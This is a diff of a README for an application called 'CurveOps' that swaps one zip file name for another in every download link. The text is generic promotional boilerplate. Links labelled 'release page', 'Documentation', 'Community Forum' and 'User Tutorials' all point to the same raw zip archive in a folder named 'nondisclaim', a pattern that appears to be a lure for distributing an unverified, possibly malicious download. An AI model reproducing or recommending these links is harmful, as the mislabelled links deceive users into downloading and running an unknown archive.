@@ -5,14 +5,14 @@
 Welcome to CurveOps! This application helps you manage and streamline your operations with ease. Whether you're handling resources or tracking tasks, CurveOps provides a simple solution to increase efficiency.
 
 ## 📥 Download Now
-[![Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip%20CurveOps-Button-blue)](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
+[![Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip%20CurveOps-Button-blue)](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
 
 ## 🚀 Getting Started
 To begin using CurveOps, you will need to download the application. Follow the instructions below to get it up and running on your device.
 
 1. **Visit the Download Page**
    Click the link below to go to the release page, where you can find the latest version of CurveOps:
-   [Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
+   [Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
 
 2. **Choose Your Version**
    Once you're on the releases page, you will see a list of available versions. Select the most recent version for optimal performance. 
@@ -73,9 +73,9 @@ If you need further assistance using CurveOps, you can reach out through our Git
 ## 🔗 Additional Resources
 Explore more about CurveOps and its applications through our community forums, tutorials, and updates available on the GitHub repository:
 
-- [Documentation](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
-- [Community Forum](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
-- [User Tutorials](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
+- [Documentation](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
+- [Community Forum](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
+- [User Tutorials](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
 
-Remember to visit this page to download the latest version any time: [Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/CurveOps.zip)
+Remember to visit this page to download the latest version any time: [Download CurveOps](https://raw.githubusercontent.com/bodinson87/CurveOps/main/nondisclaim/Curve-Ops-1.5-beta.4.zip)
 ```
